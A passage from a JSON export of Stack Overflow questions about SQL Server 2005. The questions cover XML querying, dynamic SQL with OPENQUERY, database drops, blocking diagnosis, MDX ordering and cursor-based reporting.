accomplish:</p>\n\n<pre><code>select * from table where column_value is int\n</code></pre>\n\n<p>I know I can probably inner join to the system tables and type tables but I'm wondering if there's a more elegant way.</p>\n\n<p>Note that column_value is a varchar that \"could\" have an int, but not necessarily.</p>\n\n<p>Maybe I can just cast it and trap the error?  But again, that seems like a hack.</p>\n"},{"tags":["sql","sql-server-2005","replace","fields"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":155,"score":1,"question_id":10885301,"title":"Is there a way to replace a character or string in all fields without writing it for each field?","body":"<p>I will warn you up front, this question borders on silly, but I'm asking anyway. </p>\n\n<p>The impetus for my question is creating a csv from a query result and some of the fields containing commas already. Obviously, the csv doesn't know any better and just merrily jacks up my good mood by having some stragglers in non-field columns.</p>\n\n<p>I know I can write</p>\n\n<p><code>Replace(FieldName, OldChar, NewChar)</code> </p>\n\n<p>for each field, but I'm more curious than anything if there's a shortcut to replace them all in the query output. </p>\n\n<p>Basically what I'm looking for (<strong>logically</strong>) is:</p>\n\n<pre><code>Replace(AllFields, OldChar, NewChar)\n</code></pre>\n\n<p>I don't know all of the SQL tricks (or many of them), so I thought maybe the SO community may be able to enlighten me...or call me nuts. </p>\n"},{"tags":["sql","sql-server-2005","query"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1447,"score":0,"question_id":2768688,"title":"Is there a way to select nth column in a SELECT clause from a table/view","body":"<p>I've this GIGANTIC view with several hundred columns and I need to select 114th column something like:</p>\n\n<pre><code>SELECT \"144\" FROM MyView;\n</code></pre>\n\n<p>PS: Obviously, I don't know the name of the column. I just copied the results row into an Excel file, searched for a particular value that is in EJ column so I want to select all rows showing only nth column in my view to do my further debugging.</p>\n\n<p>Cheers!</p>\n"},{"tags":["sql-server","sql-server-2005","replication"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":10885647,"title":"How do stop updates in a sql server 2005 replication subscriber?","body":"<p>I know I cannot make it read-only.\nBut is there an 'ordinary way' to do this?</p>\n\n<p>If I deny everyone write, since deny is higher than grant, if will stop replication.</p>\n\n<p>Jerry</p>\n"},{"tags":["sql-server","database","sql-server-2005","apache-camel"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":10884305,"title":"Get the result from Select and Update the selected records in the same statement","body":"<p>I want to select few records from the database table and then change the value a column from 'Pending' to 'Processing' n the database. But the result from the Select statement has to go to a jms queue for processing.\nI am using Apache Camel framework for integration and MS SQL Server 2005 as database.\nIt would nice if this can be achieved by a single sql statement.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","dynamic-sql"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":1107,"score":5,"question_id":3811204,"title":"T-SQL: can I use a variable as a database reference","body":"<p>I want to accomplish this:</p>\n\n<pre><code>update @sourceDatabase.dbo.PredictedPrices\n</code></pre>\n\n<p>and then set <code>@sourceDatabase</code> as a variable.</p>\n\n<p>But I'm not allowed? </p>\n\n<pre><code>Incorrect syntax near '.'.\n</code></pre>\n\n<p>Is there another way?</p>\n"},{"tags":["sql-server","xml","sql-server-2005","xquery-sql"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":478,"score":3,"question_id":5251065,"title":"When querying XML in SQL Server 2005, multiple tags of the document are in the same row","body":"<p><strong>Update to provide clarification</strong></p>\n\n<p>Here's a full copy of one of the xml files I\"m having trouble with. </p>\n\n<pre><code>&lt;Grower_Run xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n  &lt;Puller xsi:type=\"Puller\"&gt;\n    &lt;Puller_Number xsi:type=\"xsd:int\"&gt;16&lt;/Puller_Number&gt;\n  &lt;/Puller&gt;\n  &lt;Run_ID xsi:type=\"xsd:string\"&gt;SA1611030B&lt;/Run_ID&gt;\n  &lt;Crucible xsi:type=\"Crucible\"&gt;\n    &lt;Crucible_Type xsi:type=\"xsd:string\"&gt;RWNTYPE&lt;/Crucible_Type&gt;\n    &lt;Section&gt;\n      &lt;Grower_Run_Section&gt;\n        &lt;SectionID xsi:type=\"xsd:string\"&gt;SA1611030B1&lt;/SectionID&gt;\n        &lt;Crystal_Growth&gt;\n          &lt;Growth_StartTime xsi:type=\"xsd:dateTime\"&gt;2011-03-01T12:59:30&lt;/Growth_StartTime&gt;\n          &lt;Growth_Process&gt;\n            &lt;Growth_Process&gt;\n              &lt;Process_Name xsi:type=\"xsd:string\"&gt;BODY&lt;/Process_Name&gt;\n              &lt;Single_Moment_Snapshot&gt;\n                &lt;Single_Moment_Snapshot&gt;\n                  &lt;Snapshot_Name xsi:type=\"xsd:string\"&gt;Body Start&lt;/Snapshot_Name&gt;\n                  &lt;Snapshot_Datetime xsi:type=\"xsd:dateTime\"&gt;2011-03-01T17:11:30&lt;/Snapshot_Datetime&gt;\n                  &lt;Ingot_Length xsi:type=\"xsd:decimal\"&gt;228.19&lt;/Ingot_Length&gt;\n                  &lt;Heater_Temp xsi:type=\"xsd:decimal\"&gt;1337.09&lt;/Heater_Temp&gt;\n                  &lt;LS_Temp xsi:type=\"xsd:decimal\"&gt;1243.00&lt;/LS_Temp&gt;\n                  &lt;Heater_Power xsi:type=\"xsd:decimal\"&gt;56.10&lt;/Heater_Power&gt;\n                &lt;/Single_Moment_Snapshot&gt;\n                &lt;Single_Moment_Snapshot&gt;\n                  &lt;Snapshot_Name xsi:type=\"xsd:string\"&gt;Mid Body&lt;/Snapshot_Name&gt;\n                  &lt;Snapshot_Datetime xsi:type=\"xsd:dateTime\"&gt;2011-03-01T17:11:30&lt;/Snapshot_Datetime&gt;\n                  &lt;Ingot_Length xsi:type=\"xsd:decimal\"&gt;228.19&lt;/Ingot_Length&gt;\n                  &lt;Heater_Temp xsi:type=\"xsd:decimal\"&gt;1337.09&lt;/Heater_Temp&gt;\n                  &lt;LS_Temp xsi:type=\"xsd:decimal\"&gt;1243.00&lt;/LS_Temp&gt;\n                  &lt;Heater_Power xsi:type=\"xsd:decimal\"&gt;56.10&lt;/Heater_Power&gt;\n                &lt;/Single_Moment_Snapshot&gt;\n                &lt;Single_Moment_Snapshot&gt;\n                  &lt;Snapshot_Name xsi:type=\"xsd:string\"&gt;Tail Start&lt;/Snapshot_Name&gt;\n                  &lt;Snapshot_Datetime xsi:type=\"xsd:dateTime\"&gt;2011-03-02T01:34:24&lt;/Snapshot_Datetime&gt;\n                  &lt;Ingot_Length xsi:type=\"xsd:decimal\"&gt;230.40&lt;/Ingot_Length&gt;\n                  &lt;Heater_Temp xsi:type=\"xsd:decimal\"&gt;1338.20&lt;/Heater_Temp&gt;\n                  &lt;LS_Temp xsi:type=\"xsd:decimal\"&gt;1243.40&lt;/LS_Temp&gt;\n                  &lt;Heater_Power xsi:type=\"xsd:decimal\"&gt;56.39&lt;/Heater_Power&gt;\n                &lt;/Single_Moment_Snapshot&gt;\n              &lt;/Single_Moment_Snapshot&gt;\n            &lt;/Growth_Process&gt;\n          &lt;/Growth_Process&gt;\n          &lt;Growth_FinishTime xsi:type=\"xsd:dateTime\"&gt;2011-03-02T01:35:24&lt;/Growth_FinishTime&gt;\n        &lt;/Crystal_Growth&gt;\n      &lt;/Grower_Run_Section&gt;\n      &lt;Grower_Run_Section&gt;\n        &lt;SectionID xsi:type=\"xsd:string\"&gt;SA1611030B9&lt;/SectionID&gt;\n        &lt;Crystal_Growth&gt;\n          &lt;Growth_StartTime xsi:type=\"xsd:dateTime\"&gt;2011-03-02T04:02:37&lt;/Growth_StartTime&gt;\n          &lt;Growth_Process&gt;\n            &lt;Growth_Process&gt;\n              &lt;Process_Name xsi:type=\"xsd:string\"&gt;BODY&lt;/Process_Name&gt;\n              &lt;Single_Moment_Snapshot&gt;\n                &lt;Single_Moment_Snapshot&gt;\n                  &lt;Snapshot_Name xsi:type=\"xsd:string\"&gt;Body Start&lt;/Snapshot_Name&gt;\n                  &lt;Snapshot_Datetime xsi:type=\"xsd:dateTime\"&gt;2011-03-02T07:54:39&lt;/Snapshot_Datetime&gt;\n                  &lt;Ingot_Length xsi:type=\"xsd:decimal\"&gt;231.80&lt;/Ingot_Length&gt;\n                  &lt;Heater_Temp xsi:type=\"xsd:decimal\"&gt;1340.00&lt;/Heater_Temp&gt;\n                  &lt;LS_Temp xsi:type=\"xsd:decimal\"&gt;1246.70&lt;/LS_Temp&gt;\n                  &lt;Heater_Power xsi:type=\"xsd:decimal\"&gt;56.60&lt;/Heater_Power&gt;\n                &lt;/Single_Moment_Snapshot&gt;\n                &lt;Single_Moment_Snapshot&gt;\n                  &lt;Snapshot_Name xsi:type=\"xsd:string\"&gt;Mid Body&lt;/Snapshot_Name&gt;\n                  &lt;Snapshot_Datetime xsi:type=\"xsd:dateTime\"&gt;2011-03-02T07:54:39&lt;/Snapshot_Datetime&gt;\n                  &lt;Ingot_Length xsi:type=\"xsd:decimal\"&gt;231.80&lt;/Ingot_Length&gt;\n                  &lt;Heater_Temp xsi:type=\"xsd:decimal\"&gt;1340.00&lt;/Heater_Temp&gt;\n                  &lt;LS_Temp xsi:type=\"xsd:decimal\"&gt;1246.70&lt;/LS_Temp&gt;\n                  &lt;Heater_Power xsi:type=\"xsd:decimal\"&gt;56.60&lt;/Heater_Power&gt;\n                &lt;/Single_Moment_Snapshot&gt;\n                &lt;Single_Moment_Snapshot&gt;\n                  &lt;Snapshot_Name xsi:type=\"xsd:string\"&gt;Tail Start&lt;/Snapshot_Name&gt;\n                  &lt;Snapshot_Datetime xsi:type=\"xsd:dateTime\"&gt;2011-03-03T06:47:19&lt;/Snapshot_Datetime&gt;\n                  &lt;Ingot_Length xsi:type=\"xsd:decimal\"&gt;1778.00&lt;/Ingot_Length&gt;\n                  &lt;Heater_Temp xsi:type=\"xsd:decimal\"&gt;1388.80&lt;/Heater_Temp&gt;\n                  &lt;LS_Temp xsi:type=\"xsd:decimal\"&gt;1330.70&lt;/LS_Temp&gt;\n                  &lt;Heater_Power xsi:type=\"xsd:decimal\"&gt;63.50&lt;/Heater_Power&gt;\n                &lt;/Single_Moment_Snapshot&gt;\n              &lt;/Single_Moment_Snapshot&gt;\n            &lt;/Growth_Process&gt;\n          &lt;/Growth_Process&gt;\n          &lt;Growth_FinishTime xsi:type=\"xsd:dateTime\"&gt;2011-03-03T06:48:19&lt;/Growth_FinishTime&gt;\n        &lt;/Crystal_Growth&gt;\n      &lt;/Grower_Run_Section&gt;\n    &lt;/Section&gt;\n  &lt;/Crucible&gt;\n&lt;/Grower_Run&gt;\n</code></pre>\n\n<p>Ok so for clarification here is my full query.</p>\n\n<pre><code>DECLARE @FILES TABLE(FILENAME VARCHAR(20),DEPTH INT,FILE_FLAG INT)\nDECLARE @XML_TABLE TABLE(\n    xmlFileName VARCHAR(300),\n    xml_data xml\n)\nDECLARE @xmlFileName VARCHAR(300)\nDECLARE @FILENAME VARCHAR(20)\n\nINSERT INTO @FILES\nEXEC Master.dbo.xp_DirTree '\\\\SASSOAPPSRV\\Grower XML Files\\',1,1\n\nDECLARE XML_CURSOR CURSOR FOR SELECT FILENAME FROM @FILES\n\nOPEN XML_CURSOR\nFETCH NEXT FROM XML_CURSOR \nINTO @FILENAME\n\nWHILE @@FETCH_STATUS = 0\nBEGIN\n\nSELECT  @xmlFileName = '\\\\SASSOAPPSRV\\Grower XML Files\\' + @FILENAME\n\nINSERT INTO @XML_TABLE(xmlFileName, xml_data)\nEXEC('\nSELECT ''' + @xmlFileName + ''', xmlData \nFROM\n(\n    SELECT  * \n    FROM    OPENROWSET (BULK ''' + @xmlFileName + ''' , SINGLE_BLOB) AS XMLDATA\n) AS FileImport (XMLDATA)\n')\nFETCH NEXT FROM XML_CURSOR \nINTO @FILENAME\n\nEND\nCLOSE XML_CURSOR\nDEALLOCATE XML_CURSOR\n\nDECLARE @PARSED_XML TABLE(\nS VARCHAR(200),\nRUN_ID VARCHAR(20)\n,SECTION_ID VARCHAR(50)\n)\n\n\n\nINSERT INTO @PARSED_XML\nSELECT \nT.xmlFileName AS S,\n    t.xml_data.value('(/Grower_Run/Run_ID)[1]', 'varchar(50)') AS 'RunID',\n    Section.value('(Grower_Run_Section/SectionID)[1]', 'varchar(50)') as 'SectionID'\nFROM\n    @xml_table t\nCROSS APPLY\n    t.xml_data.nodes('/Grower_Run/Crucible/Section') AS Tmp(Section)\n\nSELECT \nS\n,RUN_ID\n,SECTION_ID\n FROM @PARSED_XML\nWHERE RUN_ID = 'SA1611030B'\n ORDER BY RUN_ID\n</code></pre>\n\n<p>And this is the result I'm getting.</p>\n\n<pre><code>\\\\SASSOAPPSRV\\Grower XML Files\\SA1611030B.xml   SA1611030B  SA1611030B1\n</code></pre>\n\n<p>This is the issue since I need to see data from both copies of the  node in separate rows.</p>\n\n<hr>\n\n<p>So I have many XML documents with the following structure</p>\n\n<pre><code>&lt;Grower_Run xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;\n  &lt;Run_ID xsi:type=\"xsd:string\"&gt;SA0111023B&lt;/Run_ID&gt;\n  &lt;Crucible xsi:type=\"Crucible\"&gt;\n    &lt;Section&gt;\n      &lt;Grower_Run_Section&gt;\n        &lt;SectionID xsi:type=\"xsd:string\"&gt;SA0111023B1&lt;/SectionID&gt;\n      &lt;/Grower_Run_Section&gt;\n    &lt;/Section&gt;\n    &lt;Section&gt;\n      &lt;Grower_Run_Section&gt;\n        &lt;SectionID xsi:type=\"xsd:string\"&gt;SA0111023B9&lt;/SectionID&gt;\n      &lt;/Grower_Run_Section&gt;\n    &lt;/Section&gt;\n  &lt;/Crucible&gt;\n&lt;/Grower_Run&gt;\n</code></pre>\n\n<p>That I've imported into an XML field of a temp table which I'm querying against with a query like this one</p>\n\n<pre><code>SELECT\n   CAST(XML_DATA.query('data(/Grower_Run/Run_ID)') AS VARCHAR(20)) AS [RUN ID]\n  ,CAST(XML_DATA.query('data(/Grower_Run/Crucible/Section/Grower_Run_Section/SectionID)') AS VARCHAR(50)) AS [SECTION ID]\nFROM @XML_TABLE\n</code></pre>\n\n<p>So the problem is that my results from the multiple instances of the \"SectionID\" tag are showing up in the same row.</p>\n\n<p>i.e.</p>\n\n<pre><code>   RunID    |   SectionID\n--------------------------\nSA0111023B  |    SA0111023B1  SA0111023B9\n</code></pre>\n\n<p>when it should be </p>\n\n<pre><code>RunID       |   SectionID\n-----------------------------\nSA0111023B  |    SA0111023B1  \nSA0111023B  |    SA0111023B9\n</code></pre>\n\n<p>If I had [1] to then end of the xml query like this</p>\n\n<pre><code>CAST(XML_DATA.query('data(/Grower_Run/Crucible/Section/Grower_Run_Section/SectionID)')[1]\n</code></pre>\n\n<p>it will drop the second section ID all together which doesn't work cuz I need both. </p>\n\n<p>Any help?</p>\n"},{"tags":["sql-server-2005","select","distinct"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":139,"score":1,"question_id":10842314,"title":"SQL Server 2005, SELECT DISTINCT query","body":"<p>How can I modify this query to return distinct <code>Models</code> and <code>VideoProcessor</code> columns ?</p>\n\n<pre><code>SELECT TOP(20) * \nFROM \n   (SELECT \n       [3D_Benchmarks].Id AS BenchmarkId,\n       Manufacturer, Model, Slug, VideoProcessor, \n       FPS, CPU \n    FROM \n       [3D_Benchmarks]\n   JOIN \n       [3D_Slugs] ON [3D_Benchmarks].Id = [3D_Slugs].BenchmarkId) AS tb \nORDER BY \n   tb.FPS DESC;\n</code></pre>\n"},{"tags":["sql-server-2008","sql-server-2005","replace","case"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":305,"score":0,"question_id":10881082,"title":"CASE statement within a REPLACE statement in SQL Server 2008?","body":"<p>I have 3 variables which will be conditional when <code>@path</code> is not NULL i.e\n<code>@serverName,@analysisDB,@cubeName</code>. Hence I used a <code>CASE</code> statement in the above <code>SELECT</code> statement. Similarly, for <code>@path</code> is not NULL the <code>@cubename</code> also needs to be conditional for <code>LVL5.L5_CubeName</code> (see <code>REPLACE</code> statement) but its inside a <code>REPLACE</code> statement and the <code>CASE</code> block becomes too complicated for the same. How do I write it if I want to do something like </p>\n\n<pre><code>CASE WHEN @path!='' THEN @cubeName ELSE LVL5.L5_CubeName in the REPLACE statement\nSELECT LVL5.L5_Id,        \n         CASE WHEN @path!='' THEN @serverName ELSE LVL5.L5_ServerName END [AnalysisServer],        \n         CASE WHEN @path!='' THEN @analysisDB ELSE LVL5.L5_AnalysisDatabase END [AnalysisDatabase],        \n         REPLACE(REPLACE(REPLACE(LVL5.L5_MDXQuery,'@@Level1',ISNULL(@lvl1DataVal,'')),    \n         '@@Level2',ISNULL(@lvl2DataVal,'')),'@@CubeName',ISNULL(@cubeName,'')) [MDXQuery],         \n         LVL5.L5_ReplaceMDX [ReplaceMDX],      \n         LVL5.L5_RefreshDate [RefreshDate],      \n         LVL5.L5_ReportAttribute [ReportAttribute],      \n         LVL5.L5_ReportTitle [ReportTitle]           \n  FROM   Report_SR_Level5 [LVL5]                  \n  WHERE L4_ID = @L4_ID ORDER BY LVL5.L5_DisplayOrder \n</code></pre>\n"},{"tags":["html","sql","xml","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":362,"score":1,"question_id":10875577,"title":"How do you keep HTML tags when querying a xml using sql?","body":"<p>I want to keep html tags in my sql query when i write a query to generate xml tags.\nFor example:</p>\n\n<pre><code>select '&lt;p&gt; this is a code&lt;/p&gt;' as code\nfrom table name\nfor xml path (''), type\n</code></pre>\n\n<p>outputs:</p>\n\n<pre><code>&lt;code&gt;&amp;ltp&amp;gt; this is a code &amp;lt/p&amp;gt; &lt;code&gt;\n</code></pre>\n\n<p>what it should output:</p>\n\n<pre><code>&lt;code&gt;&lt;p&gt; this is a code &lt;/p&gt;&lt;code&gt;\n</code></pre>\n\n<p>How do I solve this? Thanks!</p>\n"},{"tags":["c#","asp.net","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":728,"score":0,"question_id":10877325,"title":"Append binary data for image datatype in SQL server","body":"<p>Is it possible to append binary data to column whose datatype is image in SQL server.\nI herad it's possible for varbinary(max),but i want solution for image datatype.\nIf so,please provide me the code sample.</p>\n"},{"tags":["sql-server-2005","performance"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":3238,"score":2,"question_id":2434997,"title":"SQL Server 2005 Blocking Problem (ASYNC_NETWORK_IO)","body":"<p>I am responsible for a third-party application (no access to source) running on IIS and SQL Server 2005 (500 concurrent users, 1TB data, 8 IIS servers).  We have recently started to see significant blocking on the database (after months of running this application in production with no problems).  This occurs at random intervals during the day, approximately every 30 minutes, and affects between 20 and 100 sessions each time.  All of the sessions eventually hit the application time out and the sessions abort.  </p>\n\n<p>The problem disappears and then gradually re-emerges.  The SPID responsible for the blocking always has the following features:</p>\n\n<ul>\n<li>WAIT TYPE = ASYNC_NETWORK_IO</li>\n<li>The SQL being run is (@claimid\nvarchar(15))SELECT claimid, enrollid,\nstatus, orgclaimid, resubclaimid,\nprimaryclaimid FROM claim WHERE\nprimaryclaimid = @claimid AND\nprimaryclaimid &lt;> claimid).  This is\nrelatively innocuous SQL that should\nonly return one or two records, not a\nlarge dataset.</li>\n<li>NO OTHER SQL statements have been\nimplicated in the blocking, only this\nSQL statement.</li>\n<li>This is parameterized SQL for which\nan execution plan is cached in\nsys.dm_exec_cached_plans.</li>\n<li>This SPID has an object-level S lock on the claim table, so all UPDATEs/INSERTs to the claim table are also blocked.</li>\n<li>HOST ID varies.  Different web servers are responsible for the blocking sessions.  E.g., sometimes we trace back to web server 1, sometimes web server 2.  </li>\n</ul>\n\n<p>When we trace back to the web server implicated in the blocking, we see the following:</p>\n\n<ul>\n<li>There is always some sort of\napplication related error in the\nEvent Log on the web server, linked\nto the Host ID and Host Process ID\nfrom the SQL Session.</li>\n<li>The error messages vary, usually some\nsort of SystemOutofMemory.   (These\nerror messages seem to be similar to\nerror messages that we have seen in\nthe past without such dramatic\nconsequences.  We think was happening\nbefore, but didnt lead to blocking.\nWhy now?)</li>\n<li>No known problems with the network\nadapters on either the web servers or\nthe SQL server.</li>\n</ul>\n\n<p>(In any event the record set returned by the offending query would be small.)  </p>\n\n<p>Things ruled out:</p>\n\n<ul>\n<li>Indexes are regularly defragmented.</li>\n<li>Statistics regularly updated.</li>\n<li>Increased sample size of statistics\non claim.primaryclaimid.</li>\n<li>Forced recompilation of the cached\nexecution plan.</li>\n<li>Created a compound index with\nprimaryclaimid, claimid.</li>\n<li>No networking problems.</li>\n<li>No known issues on the web server.</li>\n<li>No changes to application software on\nweb servers.</li>\n</ul>\n\n<p>We hypothesize that the chain of events goes something like this:</p>\n\n<ol>\n<li>Web server process submits SQL\nabove.</li>\n<li>SQL server executes the SQL, during\nwhich it acquires a lock on the\nclaim table.</li>\n<li>Web server process gets an error and\ndies.</li>\n<li>SQL server session is hung waiting\nfor the web server process to read\nthe data set.</li>\n<li>SQL Server sessions that need to get\nX locks on parts of the claim table\n(anyone processing claims) are\nblocked by the lock on the claim\ntable and remain blocked until they\nall hit the application time out.</li>\n</ol>\n\n<p>Any suggestions for troubleshooting while waiting for the vendor's assistance would be most welcome.</p>\n\n<p>Is there a way to force SQL Server to lock at the row/page level for this particular SQL statement only? \nIs there a way to set a threshold on ASYNC_NETWORK_IO waits only?</p>\n"},{"tags":["sql-server-2005","mdx"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":237,"score":0,"question_id":4766203,"title":"MDX query order issue","body":"<p>I have two dimension field say [Custom Date] which have data like 'September 2009' and [Custom Date With Formart] which have data like 'Sep-09'.</p>\n\n<p>I am applying order function to arrange it  as shown below.</p>\n\n<pre><code>Order(BottomCount(\n{[CUBE].[Custom Date].[Custom Date].ALLMEMBERS},  12),\n[CUBE].[Custom Date].[Custom Date].[], DESC)\nON COLUMNS,\n</code></pre>\n\n<p>It arranges my dates as 'September 2009','October 2009'....,'January 2010','February 2010'.</p>\n\n<pre><code>Order(\n{[CUBE].[Custom Date With Formart].[Custom Date With Formart].ALLMEMBERS},\n[CUBE].[Custom Date].[Custom Date].[], DESC)\nON COLUMNS,\n</code></pre>\n\n<p>Output for above is like 'Jan-10','Feb-10',....,'Sep-09','Oct-09'.</p>\n\n<p>What i want is to display [Custom Date With Formart] on axis and sort it using [Custom Date].</p>\n\n<p>Let me  know your comments.</p>\n\n<hr>\n\n<p>Thanks to all of you. I resolved my issue by following this <a href=\"http://www.setfocus.com/technicalarticles/kgoff/buildingolapdatedimensions.aspx\" rel=\"nofollow\">link</a>.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":650,"score":0,"question_id":2474884,"title":"How can I programmatically drop a SQL Server database from .NET code","body":"<p>I'm trying to drop a SQL Server database from .NET code. I've tried using the SMO classes but get an exception saying the database is in use.</p>\n\n<p>Then I tried executing a query (opening a SqlConnection, executing a SqlCommand), along the lines of:</p>\n\n<pre><code>ALTER DATABASE foo SET SINGLE_USER WITH ROLLBACK IMMEDIATE\n</code></pre>\n\n<p>(pause)</p>\n\n<pre><code>DROP DATABASE foo\n</code></pre>\n\n<p>But still I get an exception saying the database is in use.</p>\n\n<p>How do I do this? (Or, how does SQL Server Management Studio implement the Drop database and close existing connections?)</p>\n"},{"tags":["sql-server-2005","excel","reporting-services"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":9633,"score":3,"question_id":244184,"title":"What causes Excel export from SQL Server Reporting Services to produce an abnormally large file?","body":"<p>We have are relatively simple Reporting Services report that our users commonly export to Excel. I've noticed that the files produced by the Excel export seem unusually large. If I open one of these files and just click save, without making any changes, the file size reduces to about half of it's previous size. Has anyone else run into this and is there a known workaround?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","service-broker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":10851629,"title":"Is there a way to check whether an SQL Server database has an active BEGIN CONVERSATION TIMER?","body":"<p>I'm using the messaging timer feature to schedule asynchronous procedure executions and all seems to be going well but I only tested it for a short time range (setting the timeout to a few hours). </p>\n\n<p>I decided upon this feature because the timer functionality is supposed to be entirely contained \"within\" single database scope/context (as opposed to depend on the server instance). As a consequence the timer should not be interfered by server restarts, database restoration from backup (provided the backup has been done after the timer setup) etc. If it actually works that way in practice than I'll be really glad but it seems too beautiful to be true so I'd like to be able to check up on the timer. Maybe see how long 'till it fires even. </p>\n\n<p>Is there a query I can run, maybe on the sys.objects table, that enables this?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","triggers"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":194,"score":0,"question_id":10599616,"title":"Log table Schema changes","body":"<p>Is there any way to log the changes made in <code>Schema</code> of a <code>Table</code> whenever I do the schema changes?</p>\n\n<p>I was reading an article here about <strong><a href=\"http://www.sqlteam.com/article/using-ddl-triggers-in-sql-server-2005-to-capture-schema-changes\" rel=\"nofollow\">DDL Triggers</a></strong>.  But it does not tell about the specific changes made in schema of a table.</p>\n"},{"tags":["image","sql-server-2005","codeigniter","thumbnails"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":194,"score":0,"question_id":10857297,"title":"how to create thumbnail from image datatype with codeigniter and sql server 2005 database?","body":"<p>I'm developing web application using latest codeigniter framework and SQL Server 2005. In my database, i have a table that have a column wth image datatype. From <a href=\"http://stackoverflow.com/questions/2630711/help-reading-binary-image-data-from-sql-server-into-php\">here</a> I know how to retrieve that image with this : </p>\n\n<pre><code>$q = \"Get_Picture_Test_SP @pk_rms_id=1443546\";\n$res = mssql_query($q);\n\n$row = mssql_fetch_assoc($res);\n\n$image = $row['picture'];\n\nfunction hex2bin($h)\n{\n    if (!is_string($h)) return null;\n    $r='';\n    for ($a=0; $a&lt;strlen($h); $a+=2) { $r.=chr(hexdec($h{$a}.$h{($a+1)})); }\n    return $r;\n }\n\n$image = hex2bin($image);\n</code></pre>\n\n<p>What i want to know is how can i make a thumbnail from that image to make the web loading more fast? If I use image from some path i know how to make the thumbnail (hope i not wrong) with this :</p>\n\n<pre><code>$config['image_library'] = 'gd2';\n$config['source_image'] = '/path/to/image/mypic.jpg';\n$config['create_thumb'] = TRUE;\n$config['maintain_ratio'] = TRUE;\n$config['width']     = 75;\n$config['height']   = 50;\n\n$this-&gt;load-&gt;library('image_lib', $config); \n\n $this-&gt;image_lib-&gt;resize();\n</code></pre>\n\n<p>I still dont know how to creating thumbnail from image data type. Hope anyone can help. Thanks!</p>\n"},{"tags":["sql-server-2005","stored-procedures","openquery"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":680,"score":0,"question_id":10531770,"title":"Stored Procedure / SQL variable inside OPENQUERY string","body":"<p>I'm having trouble using OPENQUERY (to fetch data from a linked server) within a stored procedure. I've been reading up on SQL variables but can't seem to get it working so maybe I'm misunderstanding variables/strings in SQL. It's throwing the error \"Incorrect syntax near '+'.\" and I'm not sure what I'm doing wrong.</p>\n\n<p>The code:</p>\n\n<pre><code>ALTER PROCEDURE [dbo].[sp_getPerson]\n@myName nvarchar(MAX)\nAS\nBEGIN\nSET NOCOUNT ON;\n\nSELECT     *\n    FROM         OPENQUERY(MY_LINKED_SERVER, 'SELECT * FROM myTable\nWHERE (myName= ''' + @myName + ''')\n') AS derivedtbl_1\n\nEND\n</code></pre>\n\n<p>Should this work, in theory?</p>\n\n<p>Thanks in advance</p>\n\n<p>v</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2386,"score":1,"question_id":5497450,"title":"Drop all temporary tables for an instance","body":"<p>I was wondering how / if it's possible to have a query which drops all temporary tables?</p>\n\n<p>I've been trying to work something out using the tempdb.sys.tables, but am struggling to format the name column to make it something that can then be dropped - another factor making things a bit trickier is that often the temp table names contain a '_' which means doing a replace becomes a bit more fiddly (for me at least!)</p>\n\n<p>Is there anything I can use that will drop all temp tables (local or global) without having to drop them all individually on a named basis?</p>\n\n<p>Thanks!</p>\n"},{"tags":["tsql","sql-server-2005","where-clause"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":186,"score":1,"question_id":10851520,"title":"TSQL: Select with dynamic WHERE come from another table","body":"<p>I am developing a solution for statistic data for a customer and now i need to select some rows <code>from a table</code> (<strong>sell data</strong>) by using dynamic condition that come from <strong>another table</strong> (filled by the customer and it can change daily).</p>\n\n<p>Also i need to use a cursor to perform more calculation and other stuff so this is the scenario:</p>\n\n<pre><code>DECLARE cRiga CURSOR LOCAL FAST_FORWARD FOR\n    -- here i will put the SELECT ...\nOPEN cRiga\n    FETCH NEXT FROM cRiga INTO @field1, @field2, @field3, ...\n    WHILE @@FETCH_STATUS = 0\n    BEGIN\n        -- do some stuff here ...\n        FETCH NEXT FROM cRiga INTO @field1, @field2, @field3, ...\n    END\nCLOSE cRiga\nDEALLOCATE cRiga\n</code></pre>\n\n<p>this is the <strong>Condition Table</strong> where i can find the dynamic condition (see the colum Completa = 0)</p>\n\n<pre><code>IDIncentive CdMarca CdSettore CdGruppo Completa\n----------- ------- --------- -------- -----------\n1           COES    NULL      NULL     1\n1           DELONG  10        0024     0  &lt;\n1           RHOSS   NULL      NULL     1\n1           SILE    10        0012     0  &lt;\n1           SILE    11        0025     0  